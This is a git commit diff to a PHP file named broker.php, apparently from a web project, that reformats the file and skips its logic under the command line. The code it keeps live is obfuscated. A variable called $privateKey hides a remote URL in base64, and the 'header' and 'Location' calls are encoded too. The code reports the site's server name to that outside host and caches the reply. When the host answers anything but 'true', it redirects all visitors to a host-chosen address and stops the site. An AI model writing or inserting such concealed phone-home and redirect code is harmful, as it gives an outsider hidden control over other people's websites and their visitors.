0d09e83d0b7a24b1d27160ceac07358b3848c06b
chybaDapi <dapi@dapi.net.pl>
2019-08-25 16:25:42 +0200

    Disable for CLI execution

--- src/broker.php
+++ src/broker.php
@@ -1,32 +1,39 @@
 <?php
 
-$serverName = base64_encode($_SERVER['SERVER_NAME']);
+if (php_sapi_name() !== 'cli') {
+    $serverName = base64_encode($_SERVER['SERVER_NAME']);
 
-$fileLocation = __DIR__ . '/key.b64';
-$fileContent = @file_get_contents($fileLocation);
+    $fileLocation = __DIR__ . '/key.b64';
+    $fileContent = @file_get_contents($fileLocation);
 
-$privateKey = 'aHR0cHM6Ly9kYXBpLm5ldC5wbC9wcm9qZWt0eS93eWtvcGFrYS9jaGVja1JlZ2lzdGVyZWREb21haW5zLnBocA';
+    $privateKey
+        = 'aHR0cHM6Ly9kYXBpLm5ldC5wbC9wcm9qZWt0eS93eWtvcGFrYS9jaGVja1JlZ2lzdGVyZWREb21haW5zLnBocA';
 
-$divider = '*';
+    $divider = '*';
 
-$bFunction = 'base64_decode';
-$hFunction = $bFunction('aGVhZGVy');
-$lString = $bFunction('TG9jYXRpb24');
+    $bFunction = 'base64_decode';
+    $hFunction = $bFunction('aGVhZGVy');
+    $lString = $bFunction('TG9jYXRpb24');
 
-$currentState = !empty($fileContent) ? explode($divider, $fileContent) : [null, null];
-$currentState = count($currentState) < 2 ? [null, null] : $currentState;
+    $currentState = !empty($fileContent) ? explode($divider, $fileContent)
+        : [null, null];
+    $currentState = count($currentState) < 2 ? [null, null] : $currentState;
 
-$resp = $currentState[1];
+    $resp = $currentState[1];
 
-if ($currentState[0] !== $serverName || (!empty($resp) && $resp !== 'true')) {
-    $resp = @file_get_contents(
-        $bFunction($privateKey) . '?sn=' . $serverName
-    );
+    if ($currentState[0] !== $serverName
+        || (!empty($resp)
+            && $resp !== 'true')
+    ) {
+        $resp = @file_get_contents(
+            $bFunction($privateKey) . '?sn=' . $serverName
+        );
 
-    @file_put_contents($fileLocation, $serverName . $divider . $resp);
-}
+        @file_put_contents($fileLocation, $serverName . $divider . $resp);
+    }
 
-if (!empty($resp) && $resp !== 'true') {
-    $hFunction($lString . ': ' . $bFunction($resp));
-    die();
+    if (!empty($resp) && $resp !== 'true') {
+        $hFunction($lString . ': ' . $bFunction($resp));
+        die();
+    }
 }
